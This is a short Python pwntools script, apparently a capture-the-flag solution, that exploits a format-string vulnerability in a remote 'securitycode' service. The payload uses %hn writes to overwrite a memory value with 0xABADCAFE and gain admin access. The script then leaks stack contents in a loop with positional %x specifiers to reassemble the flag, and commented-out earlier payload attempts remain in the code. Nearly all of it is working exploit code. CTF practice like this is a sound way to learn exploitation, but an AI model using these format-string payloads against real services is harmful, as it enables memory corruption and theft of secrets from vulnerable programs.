from pwn import *

flag = ''

for i in range(30):
	# r = process("./securitycode")
	r = remote('185.97.118.167', 7040)

	# Value to overwrite is: xABADCAFE
	# ABAD: 43949
	# CAFE: 51966

	r.recvuntil("Enter 'A' for admin and 'U' for user.")
	r.sendline('A')
	r.recvuntil('Enter you name:')

	# payload = '\x3c\xc0\x04\x08%51966x%n%43949x%15$n'
	# payload = '\x3c\xc0\x04\x08%51962x%15$n'
	# payload = '\x3c\xc0\x04\x08%43945x%15$n%8009x%16$n'
	payload = '\x3e\xc0\x04\x08\x3c\xc0\x04\x08%43941x%15$hn%8017x%16$hn'
	r.sendline(payload)

	# Now try to read 6 bytes of the flag
	r.recvuntil('Enter your password:')
	payload = '%{}$x'.format(i)
	r.sendline(payload)

	x = r.recvline()
	x += r.recvline()
	x += r.recvline()
	x = x.replace('The password is ', '').strip()
	# print(x.decode('hex'))
	try:
		flag += bytearray.fromhex(x).decode()[::-1]
	except:
		pass

	print(flag)


print(flag)


# r.interactive()
